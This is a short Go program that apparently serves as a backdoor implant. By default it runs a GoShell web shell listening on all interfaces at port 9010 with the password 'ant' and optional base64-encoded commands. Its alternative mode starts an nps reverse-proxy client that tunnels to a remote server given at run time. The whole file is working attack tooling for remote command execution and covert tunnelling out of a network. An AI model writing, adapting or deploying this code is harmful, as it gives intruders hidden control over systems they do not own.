package main

import (
	"flag"
	"net/http"

	"github.com/wd0g/GoShell/lib/server"

	"ehang.io/nps/client"
)

var (
	mode         = flag.String("m", "shell", "[shell, npc]")
	shellAddr    = flag.String("shell-addr", "0.0.0.0:9010", "")
	shellPwd     = flag.String("shell-pwd", "ant", "")
	shellDecoder = flag.String("shell-decoder", "plain", "[plain, base64]")
	npcServer    = flag.String("server", "", "")
	npcVkey      = flag.String("vkey", "", "")
	npcType      = flag.String("type", "", "")
)

func main() {
	flag.Parse()

	switch *mode {
	case "npc":
		cli := client.NewRPClient(*npcServer, *npcVkey, *npcType, "", nil, 60)
		cli.Start()
	case "shell":
		handler := server.Handler{
			Pwd:     *shellPwd,
			Decoder: *shellDecoder,
		}
		http.ListenAndServe(*shellAddr, handler)
	}
}
